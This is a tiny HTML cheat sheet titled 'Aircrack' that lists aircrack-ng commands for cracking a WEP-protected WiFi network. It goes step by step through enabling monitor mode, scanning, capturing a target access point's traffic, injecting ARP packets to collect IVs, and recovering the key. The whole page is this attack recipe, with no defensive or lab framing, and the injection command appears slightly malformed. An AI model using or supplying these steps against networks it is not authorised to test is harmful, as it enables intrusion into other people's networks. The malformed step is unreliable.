<title>Aircrack</title>
</head><body>WiFi in Monitor mode<br/>
&nbsp;&#09;airmon-ng start wlan0<br/>
Search for wireless<br/>
&nbsp;&#09;airodump-ng mon0<br/>
Capture or inject<br/>
&nbsp;&#09;airodump-ng --bssid &lt;bssid&gt; -c &lt;#&gt; -w WEPcrack mon0<br/>
Inject ARP to capture IVs<br/>
&nbsp;&#09;aireplay-ng -e -b &lt;bssid&gt; -h &lt;mac&gt; mon0<br/>
Crack (needs several thousand IVs)<br/>
&nbsp;&#09;aircrack-ng WEPcrack.cap</body></html>
